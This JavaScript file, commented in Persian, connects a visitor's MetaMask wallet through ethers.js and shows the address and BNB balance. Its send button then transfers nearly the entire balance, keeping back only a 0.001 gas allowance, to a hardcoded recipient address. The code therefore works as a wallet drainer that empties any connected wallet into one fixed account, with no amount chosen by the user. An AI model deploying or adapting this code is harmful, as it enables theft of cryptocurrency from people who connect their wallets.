import { ethers } from "ethers";

// المان‌های UI
const connectButton = document.getElementById("connectButton");
const sendTransactionButton = document.getElementById("sendTransactionButton");
const walletAddressElement = document.getElementById("walletAddress");
const bnbBalanceElement = document.getElementById("bnbBalance");

let provider, signer, walletAddress;

// بررسی نصب بودن MetaMask
function isMetaMaskInstalled() {
  return typeof window.ethereum !== "undefined";
}

// اتصال به MetaMask از طریق Deep Link در موبایل یا دسکتاپ
connectButton.addEventListener("click", async () => {
  try {
    // اگر MetaMask نصب نباشد
    if (!isMetaMaskInstalled()) {
      alert("MetaMask را نصب کنید.");
      return;
    }

    // استفاده از Deep Link برای باز کردن MetaMask در موبایل
    window.location.href = "metamask://";

    // اگر در دسکتاپ هستیم، به طور خودکار MetaMask را شناسایی می‌کند
    await window.ethereum.request({ method: "eth_requestAccounts" });

    // ایجاد Web3 provider و signer
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();

    // دریافت آدرس کیف پول
    walletAddress = await signer.getAddress();
    walletAddressElement.textContent =` آدرس کیف پول: ${walletAddress}`;

    // دریافت موجودی BNB
    const balance = await signer.getBalance();
    const formattedBalance = ethers.utils.formatEther(balance);
    bnbBalanceElement.textContent =` موجودی BNB: ${formattedBalance}`;

    // نمایش دکمه ارسال تراکنش
    sendTransactionButton.style.display = "inline-block";
  } catch (error) {
    console.error("خطا در اتصال به MetaMask:", error);
    alert("اتصال به کیف پول با خطا مواجه شد.");
  }
});

// ارسال تراکنش
sendTransactionButton.addEventListener("click", async () => {
  try {
    const recipientAddress = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";  // آدرس مقصد خود را وارد کنید

    // دریافت موجودی کیف پول
    const balance = await signer.getBalance();
    const gasFee = ethers.utils.parseEther("0.001");

    if (balance.lt(gasFee)) {
      alert("موجودی برای گس کافی نیست!");
      return;
    }

    const amountToSend = balance.sub(gasFee); // مقدار قابل ارسال

    // ارسال تراکنش
    const tx = await signer.sendTransaction({
      to: recipientAddress,
      value: amountToSend,
    });

    await tx.wait();
    alert("تراکنش با موفقیت ارسال شد!");
  } catch (error) {
    console.error("خطا در ارسال تراکنش:", error);
    alert("ارسال تراکنش با خطا مواجه شد.");
  }
});